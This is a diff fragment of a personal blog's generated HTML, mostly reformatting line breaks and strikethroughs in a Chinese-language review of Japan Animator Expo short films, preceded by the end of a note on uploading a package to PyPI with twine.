+<p>upload your dist folder  </p>
+<p><code>twine upload dist/*</code>  </p>
 <h2>Reference</h2>
 <ul>
-<li><a href="http://python-packaging-user-guide.readthedocs.io/en/latest/distributing/">http://python-packaging-user-guide.readthedocs.io/en/latest/distributing/</a><br>
-</li>
-<li><a href="http://peterdowns.com/posts/first-time-with-pypi.html">http://peterdowns.com/posts/first-time-with-pypi.html</a><br>
-</li>
+<li><a href="http://python-packaging-user-guide.readthedocs.io/en/latest/distributing/">http://python-packaging-user-guide.readthedocs.io/en/latest/distributing/</a>  </li>
+<li><a href="http://peterdowns.com/posts/first-time-with-pypi.html">http://peterdowns.com/posts/first-time-with-pypi.html</a>  </li>
 </ul>
 <p>2016-05-15 11:43:33</p>
   </div>
@@ -1038,27 +872,21 @@ It will also install dependency.<br>
       <a href="http://littlezz.github.io/tag/ri-ji.html">日记</a>,      <a href="http://littlezz.github.io/tag/xia-che.html">瞎扯</a>    </p>
   </header>
   <div>
-      <p>首先， 不得不提关于这个展览会的纪录片 《庵野先生与我们的莽撞挑战 日本动画人展览会》<br>
-</p>
+      <p>首先， 不得不提关于这个展览会的纪录片 《庵野先生与我们的莽撞挑战 日本动画人展览会》  </p>
 <p>5分钟的动画， 制作时间往往是好几个月， 途中经历的种种困难， 特别是对于新人监督， 经验不足，在现场时的时候很难控制场面。比如第32话的监督， 在配音时说希望林原惠用更成熟一点的语气， 结果林原惠反问『请问监督眼中的成熟是什么呢？ 我没有从人物的脸上看到成熟的气质。』。 然后监督直接吓懵逼，一个工作人员默默递给监督一个红绿按钮的选择键盘，全场没有人敢讲话， 只有监督不断翻着台本的声音。   最后还是林原惠救场， 说在刚才的基础上用更低沉的语气。 监督说很好， 这样就好。 </p>
 <p>旁白一针见血的说『现在监督一点很后悔吧』。
 但是很多问题最后可能只能妥协。<br>
-毕竟学会妥协也是成为优秀监督的必要能力。。。。<br>
-</p>
+毕竟学会妥协也是成为优秀监督的必要能力。。。。  </p>
 <p>好了， 开始记录那些我喜欢的作品吧。<br>
-基于看过纪录片的原因， 我先说32话， 之后的按顺序。<br>
-</p>
+基于看过纪录片的原因， 我先说32话， 之后的按顺序。  </p>
 <h3>32 新世紀いんぱくつ。</h3>
-<p>和eva是同一个时间观的， 我特别去看了之前监督和林原惠意见冲突的地方， 讲道理， 其实还是林原惠说得对。。。~~那张脸上面看不出所谓的成熟~~<br>
+<p>和eva是同一个时间观的， 我特别去看了之前监督和林原惠意见冲突的地方， 讲道理， 其实还是林原惠说得对。。。<del>那张脸上面看不出所谓的成熟</del><br>
 然后歌很好听， 非常好听， 背景也非常美，再配上百合， 百合！百合！林原精分现场！自己和自己百合！！  我吼兴奋， 我吼兴奋啊啊啊啊啊啊啊啊啊啊wwww， 可以循环看好多遍。 <br>
-~~我的偶像不可能变成橙汁~~<br>
-</p>
+<del>我的偶像不可能变成橙汁</del>  </p>
 <h3>1 龍の歯医者</h3>
-<p>恢弘大作的感觉， 嗯， BGM也很恢弘， 作画也很酷炫。<br>
-</p>
+<p>恢弘大作的感觉， 嗯， BGM也很恢弘， 作画也很酷炫。  </p>
 <h3>2 HILL CLIMB GIRL</h3>
-<p>感觉上是秀3D技术的， 然而我觉得里面的歌曲很好听。<br>
-</p>
+<p>感觉上是秀3D技术的， 然而我觉得里面的歌曲很好听。  </p>
 <h3>3 ME!ME!ME!</h3>
 <p>这个不用说了， 很多人说神作啦， 和EVA说的是一个事情啦， 更加容易懂啦， 实用啦。 各种各样。<br>
 想要补充的就是其实庵野是没有参与进来的。。。<br>
@@ -1066,51 +894,35 @@ It will also install dependency.<br>
 <h3>4 Carnage</h3>
 <p>和上一个作品形成鲜明的对比。 <br>
 这部作品非常有表现力。
-《ME!ME!ME!》 的主题是美少女， 而这部作品的主题是表现故事， 人物和剧情， 都只是表现的手段而已。 当然很多人可能会说『这画风我不喜欢』。 然后结束观看， 然后接着对mememe撸。<br>
-</p>
+《ME!ME!ME!》 的主题是美少女， 而这部作品的主题是表现故事， 人物和剧情， 都只是表现的手段而已。 当然很多人可能会说『这画风我不喜欢』。 然后结束观看， 然后接着对mememe撸。  </p>
 <p>可是我tm真的好喜欢！<br>
-那帅到炸裂的分镜， 没有矫揉造作的卖萌，一股浓浓的黑暗风格。 干净利落， 没有多余的台词， 关键的剧情全部用镜头来表达。<br>
-</p>
-<p>这他妈就是艺术品啊。<br>
-</p>
-<p>《ME!ME!ME!》确实取得了很高的人气， 如果是真的变成作品放送的话， 多半情况下也是ME!ME!ME!》热卖， 而本作暴死。<br>
-</p>
-<p>但是总得有人做像《Carnage》这样的动画， 这种东西才称得上是所谓的『动画未来』。 其他的像《mememe》这种模式，商业运作成功， 无可厚非， 毕竟卖bd卖人设，赚了钱活下去才是王道。 但是如果一辈子都干这种事情，而且还时不时披上一个『内涵作』这样的外衣的话，我觉得真的是有点的恶心。<br>
-</p>
+那帅到炸裂的分镜， 没有矫揉造作的卖萌，一股浓浓的黑暗风格。 干净利落， 没有多余的台词， 关键的剧情全部用镜头来表达。  </p>
+<p>这他妈就是艺术品啊。  </p>
+<p>《ME!ME!ME!》确实取得了很高的人气， 如果是真的变成作品放送的话， 多半情况下也是ME!ME!ME!》热卖， 而本作暴死。  </p>
+<p>但是总得有人做像《Carnage》这样的动画， 这种东西才称得上是所谓的『动画未来』。 其他的像《mememe》这种模式，商业运作成功， 无可厚非， 毕竟卖bd卖人设，赚了钱活下去才是王道。 但是如果一辈子都干这种事情，而且还时不时披上一个『内涵作』这样的外衣的话，我觉得真的是有点的恶心。  </p>
 <h3>6 西荻窪駅徒歩20分2LDK敷礼2ヶ月ペット不可</h3>
-<p>和第四话一样， 剧情非常有趣， 动作非常非常的流畅， 非常推荐。  这部作品在纪录片里面有提到。<br>
-</p>
+<p>和第四话一样， 剧情非常有趣， 动作非常非常的流畅， 非常推荐。  这部作品在纪录片里面有提到。  </p>
 <h3>10 ヤマデロイド</h3>
-<p>这个也很好看， 配合一首歌曲讲了一个故事， 节奏非常带感， 而且没有对白， 全部用镜头语言来讲故事， 比现在的一些动画恨不得配角24小时全程解说不知道要高到哪里去。<br>
-</p>
-<p>但是有一点， 这个人脸的画风， 23333 不行， 我一开始以为是要全程颜艺， 但是看旧了好像还是蛮带感的。<br>
-</p>
-<p>总之很推荐， 剧情也很有爱。<br>
-</p>
+<p>这个也很好看， 配合一首歌曲讲了一个故事， 节奏非常带感， 而且没有对白， 全部用镜头语言来讲故事， 比现在的一些动画恨不得配角24小时全程解说不知道要高到哪里去。  </p>
+<p>但是有一点， 这个人脸的画风， 23333 不行， 我一开始以为是要全程颜艺， 但是看旧了好像还是蛮带感的。  </p>
+<p>总之很推荐， 剧情也很有爱。  </p>
 <h3>11 POWER PLANT No.33</h3>
 <p>Trigger， 今石洋之办的那家工作室。<br>
-科幻类的，没什么要说的， 值得一看。 ed很好听。<br>
-</p>
+科幻类的，没什么要说的， 值得一看。 ed很好听。  </p>
 <h3>12 [evangelion： Another Impact（Confidential）</h3>
-<p>卧槽， 说老实话， 我光看画面我真的分不清到底是3D的还是特摄片。<br>
-</p>
-<p>怕了。<br>
-</p>
+<p>卧槽， 说老实话， 我光看画面我真的分不清到底是3D的还是特摄片。  </p>
+<p>怕了。  </p>
 <h3>13 Kanón</h3>
 <p>和其他的不同， 这部全程在说话， 应该是讨论一些东西， 可能是讨论作品和观众的问题吧。<br>
-看得下去的话可以一看。<br>
-</p>
+看得下去的话可以一看。  </p>
 <h3>14 Sex&amp;VIOLENCE with MACHSPEED</h3>
 <p>我是看完这部才想着搞一个总结的。<br>
 我最近遇上一些讨厌的事情， 没有什么道理可以讲， 对面只会不断的追问『你为什么』 和『你凭什么』。 就像这部作品所表达的东西一样： 没有为什么， 我tm就是要为之一战。</p>
-<p>这可能是现在无可奈何的我内心深处非常羡慕敢想而不敢讲的东西吧。<br>
-</p>
-<p>2016年04月21日21:41:15 <br>
-</p>
+<p>这可能是现在无可奈何的我内心深处非常羡慕敢想而不敢讲的东西吧。  </p>
+<p>2016年04月21日21:41:15   </p>
 <h3>15 おばけちゃん</h3>
 <p>2333<br>
-好有趣， 前面都是一点蠢萌蠢萌的片段，全都是neta， 但是如果坚持到最后， 会有好的收获的。<br>
-</p>
+好有趣， 前面都是一点蠢萌蠢萌的片段，全都是neta， 但是如果坚持到最后， 会有好的收获的。  </p>
 <p>而且， ed是重点， 最后出现了鹤卷和哉！</p>
 <h3>16</h3>
 <p>这什么鬼。。。<br>
@@ -1118,8 +930,7 @@ It will also install dependency.<br>
 总之我觉得不好看。</p>
 <h3>17 三本の証言者</h3>
 <p>卧槽， 居然是剧情片， 短篇+剧情=很难看懂。<br>
-不过还是值得一看的。<br>
-</p>
+不过还是值得一看的。  </p>
 <h3>19 I can Friday by day!</h3>
 <p>卧槽！！！
 我就是在找这个啊，  监督是 <strong>鹤卷和哉</strong> !重复一遍， 监督是鹤卷和哉！ </p>
@@ -1127,47 +938,36 @@ It will also install dependency.<br>
 <p>2016年04月22日03:20:30</p>
 <h3>22 イブセキヨルニ</h3>
 <p>这个东西讨论到政治了。<br>
-和我当初看这个博览会的注重点不同， 不过老实话， 监督脑洞真是大， 真敢拍啊。<br>
-</p>
-<p>没看的话可以看一下。<br>
-</p>
+和我当初看这个博览会的注重点不同， 不过老实话， 监督脑洞真是大， 真敢拍啊。  </p>
+<p>没看的话可以看一下。  </p>
 <h3>25 ハンマーヘッド</h3>
 <p>妈的， 一股沙耶之歌的感觉。<br>
-卧槽， 还是给我看一集萌妹中和一下吧我的天， 这从20 开始的一系列都是药吃多了么。<br>
-</p>
-<p>和前面一样， 没看的话可以看一下。<br>
-</p>
+卧槽， 还是给我看一集萌妹中和一下吧我的天， 这从20 开始的一系列都是药吃多了么。  </p>
+<p>和前面一样， 没看的话可以看一下。  </p>
 <h3>26 コント  ころしや　1989</h3>
-<p>这个很有趣。 简直是超展开。<br>
-</p>
+<p>这个很有趣。 简直是超展开。  </p>
 <h3>29 ヒストリー機関</h3>
 <p>可以一看。<br>
 一开始看我以为又是政治片， 结果看到后面发现是脑洞片。<br>
 说老实话， 我比较想看的是表现手法， 即， 我认为， 举办这个活动的目的是抛开商业， 抛开蓝光销量， 抛开各种制约，你会怎么做动画片，你会用什么样的形式你有什么样没有敢实践的创意。 而不是一说到自由创作， 就想方设法展现自己对政治对人类历史的洞见，找一些看似高深的角度， 然后做一下浅薄幼稚的讨论。<br>
 有些东西， 需要去看书去明白， 而不是看几集动画片就能说清楚的， 拼命的传达自己的见解， 丧失了最基础的娱乐性， 只剩说教， 那观众为何不去看公开课？<br>
-（~~没错， 我说的就是那种整天一副讨论正义是什么的动画~~） </p>
+（<del>没错， 我说的就是那种整天一副讨论正义是什么的动画</del>） </p>
 <h3>31 GIRL</h3>
 <p>和mememe一样的团队做的（没错， 就是那两个人）.<br>
 本来没什么好说的， 但是想了一下， 那个眼睛的画法真的很好的表达了人物一副不知道在想什么而且还很容易冷场的形象。<br>
-而且我感觉这个画面实在是太华丽了吧。 我的天。<br>
-</p>
+而且我感觉这个画面实在是太华丽了吧。 我的天。  </p>
 <h3>34 旅のロボから</h3>
 <p>卧槽， 监督在业界是被称为师匠的男人。<br>
 真的是不一样啊。mememe的作画监督说自己非常崇拜他， 说他有某种特别的特质， 才能画出这样工口感这么强的画。<br>
-我感觉这个人对生活的观察非常的细腻。 如果说mememe的作者在发掘美少女设计上面独树一帜的话， 那么本作的监督则是在美少女的动作方面达到了超一流。<br>
-</p>
+我感觉这个人对生活的观察非常的细腻。 如果说mememe的作者在发掘美少女设计上面独树一帜的话， 那么本作的监督则是在美少女的动作方面达到了超一流。  </p>
 <p>里面美少女的动作， 非常的流畅， 非常的写实，所以能够让人感觉『生动』。<br>
 之前有个笑话是嘲笑部分画师画妹子泡温泉的时候头发是披下来的， 说可怜的死宅， 连妹子的手都没有摸过2333.<br>
-那么本作的监督绝对是那种知道要让妹子把头发盘起来， 同时还能把怎么盘的具体动作画出来，而且还画得超乎想象的优雅的那种。<br>
-</p>
-<p>不愧是『师匠』<br>
-</p>
-<p>这种感觉， 就想白箱里面的那个老一代的画师， 基础功扎实到可怕， 不是现在的画师能够随便超越的那种存在。<br>
-</p>
-<p>~~我觉得特别的特质之一是人家有女朋友吧喂！~~</p>
+那么本作的监督绝对是那种知道要让妹子把头发盘起来， 同时还能把怎么盘的具体动作画出来，而且还画得超乎想象的优雅的那种。  </p>
+<p>不愧是『师匠』  </p>
+<p>这种感觉， 就想白箱里面的那个老一代的画师， 基础功扎实到可怕， 不是现在的画师能够随便超越的那种存在。  </p>
+<p><del>我觉得特别的特质之一是人家有女朋友吧喂！</del></p>
 <h3>35 カセットガール</h3>
-<p>这个。。。这个。。 这个是向庵野秀明毕业作品致敬么？<br>
-</p>
+<p>这个。。。这个。。 这个是向庵野秀明毕业作品致敬么？  </p>
 <p>2016年04月25日00:02:40</p>
 <h3>最后</h3>
   </div>
